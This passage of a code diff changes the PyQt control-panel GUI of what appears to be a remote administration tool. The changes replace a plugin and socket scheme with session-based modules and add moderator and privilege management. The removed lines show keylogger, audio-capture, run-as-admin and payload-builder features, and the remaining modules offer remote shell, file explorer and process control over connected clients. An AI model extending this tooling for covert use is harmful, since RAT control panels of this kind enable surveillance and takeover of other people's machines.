                 server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), _('RM_LOCK'),
                                               self.lock_client)
-                server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _('RM_TERMINATE'),
-                                              self.terminate_client)
+                if self.privs == 1:
+                    server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _('RM_TERMINATE'),
+                                                  self.terminate_client)
             else:
                 server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), _('RM_UNLOCK'), self.unlock_client)
 
@@ -927,57 +843,38 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     # get item
     def current_client(self):
         try:
-            return int(self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_socket).text())
+            return str(self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_id).text())
         except AttributeError:
             return False
 
-    def send_run_signal(self, sock, signal):
-        signals = {
-            'shellMode': 'executeShell()',
-            'explorerMode': 'executeExplorer()',
-            'audioMode': 'executeAudio()',
-            'keyloggerMode': 'executeKeylogger()',
-            'scriptingMode': 'executeScripting()',
-            'processesMode': 'executeProcesses()',
-        }
-        if signal in signals:
-            self.current_sock = sock
-            self.emit(SIGNAL(signals[signal]))
-
-    def execute_plugin(self, plugin):
-        plugins = {
+    def execute_module(self, module):
+        modules = {
             'shell': mshell,
             'explorer': mexplorer,
-            'audio': maudio,
-            'keylogger': mkeylogger,
             'scripting': mscript,
             'processes': mprocesses,
         }
 
-        server = self.current_client()
-        if server:
+        client = self.current_client()
+        if client:
             args = {
-                'sock': self.current_sock,
-                'socket': self.socks[server]['socket'],
-                'ipAddress': self.socks[server]['ip_address'],
+                'sock': self.connection_socket,
+                'client': client,
+                'session_id': self.session_id,
                 'assets': assets,
             }
-            plugin_id = id_generator()
-            if plugin in plugins:
-                self.pluginsBank[plugin_id] = plugins[plugin].mainPopup(args)
-                self.pluginsBank[plugin_id].show()
+            module_id = id_generator()
+            print module
+            if module in modules:
+                self.modulesBank[module_id] = modules[module].mainPopup(args)
+                self.modulesBank[module_id].show()
 
     def add_alias(self):
         client = self.current_client()
         if client:
             text, ok = QInputDialog.getText(self, _('ALIAS_SET'), _('ALIAS_NAME'))
             if ok:
-                get(self.connection_socket, 'setAlias ' + str(text), self.streaming_socks[client]['id'])
-
-    def run_as_admin(self):
-        client = self.current_client()
-        if client:
-            get(self.connection_socket, 'runasadmin', client)
+                data_send(self.connection_socket, '%s %s' % (client, str(text)), 'setAlias', self.session_id)
 
     def terminate_client(self):
         client = self.current_client()
@@ -986,18 +883,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
             ans = warn.exec_()
             if ans == QMessageBox.Yes:
-                send(self.connection_socket, 'terminateServer', str(client))
-
-    def run_plugin(self, mode):
-        client = self.current_client()
-        if client:
-            get(client, 'startChildSocket %s' % client, mode)
+                data_send(self.connection_socket, 'terminateClient', 'terminateClient', session_id=self.session_id, to=client)
 
     def update_settings(self):
         self.settings = Config()
         self.IPADDRESS = self.settings.ip_address
         self.PORT = self.settings.port
-        self.USERNAME = self.settings.username
         self.LANGUAGE = self.settings.language
 
     def run_settings(self):
@@ -1007,30 +898,127 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.settings_form = Settings(args)
         self.settings_form.show()
 
-    def run_builder(self):
-        args = {
-            'language': self.LANGUAGE
-        }
-        self.builder_form = Builder(args)
-        self.builder_form.show()
-
     def administrator_set_moderator(self):
         client = self.current_client()
         if client:
-            text, ok = QInputDialog.getText(self, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME') + self.USERNAME, QLineEdit.Normal)
+            text, ok = QInputDialog.getText(self, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
             if ok:
-                get(self.connection_socket, 'setModerator ' + str(text), client)
+                data_send(self.connection_socket, '%s %s' % (client, text), 'setModerator', session_id=self.session_id)
 
     def closeEvent(self, event):
         self.acceptthreadState = False
         sys.exit(1)
 
+    # MODERATORS COMMANDS
+    def get_moderators(self):
+        if self.privs == 1:
+            try:
+                all_moderators = data_get(self.connection_socket, 'getModerators', 'getModerators', session_id=self.session_id)
+                print all_moderators
+            except SyntaxError:
+                return
+
+            moderators = all_moderators['payload']
+            self.moderatorsTable.setRowCount(len(moderators))
+
+            for index, key in enumerate(moderators):
+
+                # add moderator id
+                item = QTableWidgetItem(key)
+                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
+                self.moderatorsTable.setItem(index, 0, item)
+
+                # add online clients count
+                item = QTableWidgetItem(str(moderators[key]['online_clients']))
+                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
+                self.moderatorsTable.setItem(index, 1, item)
+
+                # add offline clients count
+                item = QTableWidgetItem(str(moderators[key]['offline_clients']))
+                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
+                self.moderatorsTable.setItem(index, 2, item)
+
+                # add privileges
+                privileges = moderators[key]['privileges']
+                if privileges == 1:
+                    color = '#9b59b6'
+                    privileges = _('MODERATORS_PRIVILEGES_ADMINISTRATOR')
+                else:
+                    color = '#c9f5f7'
+                    privileges = _('MODERATORS_PRIVILEGES_MODERATOR')
+                item = QTableWidgetItem(privileges)
+                item.setTextColor(QColor(color))
+                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
+                self.moderatorsTable.setItem(index, 3, item)
+
+                # add moderator status
+                status = moderators[key]['status']
+                if status == 1:
+                    style = '#1abc9c'
+                    text = _('MODERATOR_ONLINE')
+                else:
+                    style = '#e67e22'
+                    text = _('MODERATOR_OFFLINE')
+                item = QTableWidgetItem(text)
+                item.setTextColor(QColor(style))
+                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
+                self.moderatorsTable.setItem(index, 4, item)
+
+                # add moderator last online
+                item = QTableWidgetItem(str(moderators[key]['last_online']))
+                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+                self.moderatorsTable.setItem(index, 5, item)
+
+
+    # Add Moderator Entry
+    def add_moderator(self):
+        # Get Username
+        username, ok = QInputDialog.getText(self, _('ADMINISTRATION_INPUT_USERNAME'), _('ADMINISTRATION_USERNAME'), QLineEdit.Normal)
+        if ok and len(str(username)) > 0:
+            username = str(username)
+            # Get Password
+            password, ok = QInputDialog.getText(self, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
+            if ok and len(str(password)) > 4:
+                password = str(password)
+                # Get Privileges
+                privileges, ok = QInputDialog.getItem(self, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'), ('0', '1'), 0, False)
+                admin = str(privileges)
+                if ok and privileges:
+                    # If everything ok
+                    data_send(self.connection_socket, '%s %s %s' % (username, password, admin), 'addModerator', session_id=self.session_id)
+                    # Update Moderators Table
+                    self.get_moderators()
+                else:
+                    # If not privileges
+                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PRIVILEGES'), _('ADMINISTRATION_INCORRECT_PRIVILEGES'))
+                    ans = warn.exec_()
+                    return
+            # if not password
+            else:
+                warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
+                ans = warn.exec_()
+                return
+        # if not password
+        else:
+            warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_USERNAME'), _('ADMINISTRATION_INCORRECT_USERNAME'))
+            ans = warn.exec_()
+            return
+
 
 # Run Application
 if __name__ == '__main__':
     app = QApplication(sys.argv)
-    form = MainDialog()
 
+    # Create and display the splash screen
+    splash_pix = QPixmap(os.path.join(assets, 'splash.png'))
+    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
+    splash.setMask(splash_pix.mask())
+    splash.show()
+    app.processEvents()
+    time.sleep(3)
+
+    form = MainDialog()
+    splash.finish(form)
     form.show()
 
     sys.exit(app.exec_())
